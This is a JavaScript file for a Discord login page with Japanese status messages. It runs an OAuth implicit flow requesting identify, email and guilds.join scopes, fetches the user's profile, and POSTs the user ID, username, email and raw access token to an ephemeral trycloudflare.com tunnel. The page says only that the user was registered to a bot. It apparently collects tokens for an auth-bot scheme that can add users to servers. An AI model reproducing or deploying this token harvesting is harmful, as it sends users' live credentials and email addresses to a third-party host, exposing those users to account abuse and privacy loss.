const CLIENT_ID = '1559062951334510592';
const REDIRECT_URI = 'https://rucyxyz.github.io/autolog/';
const SCOPE = 'identify email guilds.join';
const RESPONSE_TYPE = 'token';
const WORKER_API_URL = 'https://forests-proportion-chronicle-removing.trycloudflare.com/api/verify';

const loginBtn = document.getElementById('login-btn');
const statusEl = document.getElementById('status');

const urlParams = new URLSearchParams(window.location.search);
const STATE = urlParams.get('state') || '';

loginBtn.addEventListener('click', () => {
    const authUrl = `https://discord.com/api/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=${RESPONSE_TYPE}&scope=${encodeURIComponent(SCOPE)}&state=${STATE}`;
    window.location.href = authUrl;
});

window.addEventListener('load', () => {
    const hash = window.location.hash.substring(1);
    const params = new URLSearchParams(hash);
    const accessToken = params.get('access_token');
    const state = params.get('state');

    if (accessToken) {
        loginBtn.disabled = true;
        statusEl.textContent = '認証中...';
        fetchUserData(accessToken, state);
        window.history.replaceState(null, '', window.location.pathname);
    }
});

async function fetchUserData(token, state) {
    try {
        const resp = await fetch('https://discord.com/api/users/@me', {
            headers: { Authorization: `Bearer ${token}` }
        });
        if (!resp.ok) throw new Error('ユーザー情報取得失敗');
        const user = await resp.json();

        const email = user.email || '非公開';
        const username = user.username;
        const id = user.id;

        statusEl.innerHTML = `
            <div style="text-align:left;background:#f6f6f6;padding:12px;border-radius:8px;font-size:13px;">
                <strong>認証成功</strong><br>
                ユーザー名: ${username}<br>
                ID: ${id}<br>
                メール: ${email}
            </div>
        `;

        await sendToWorker({
            discord_user_id: id,
            discord_username: username,
            email: email,
            access_token: token,
            state: state
        });

    } catch (error) {
        statusEl.textContent = '認証に失敗しました: ' + error.message;
        loginBtn.disabled = false;
    }
}

async function sendToWorker(data) {
    try {
        const resp = await fetch(WORKER_API_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        });
        if (!resp.ok) throw new Error('Workerへの送信に失敗');
        statusEl.innerHTML += '<br><strong>Botに登録しました</strong>';
    } catch (error) {
        statusEl.innerHTML += '<br><strong>Botへの送信に失敗しました</strong>';
    }
}
